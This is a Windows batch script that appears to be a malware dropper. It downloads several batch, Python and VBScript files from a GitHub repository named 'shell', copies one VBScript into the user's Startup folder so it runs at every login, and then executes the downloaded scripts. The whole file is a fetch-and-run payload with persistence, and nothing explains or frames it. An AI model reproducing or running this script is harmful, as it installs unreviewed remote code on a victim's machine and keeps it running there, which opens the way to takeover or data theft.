@echo off
set "downloads_dir=%USERPROFILE%\Downloads"
curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat
curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs
curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%downloads_dir%\vb1.vbs"
curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%downloads_dir%\post.bat"
curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%downloads_dir%\post.vbs"
copy "%downloads_dir%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
start /wait D:\vb.vbs
call "%downloads_dir%\vb1.vbs"
exit
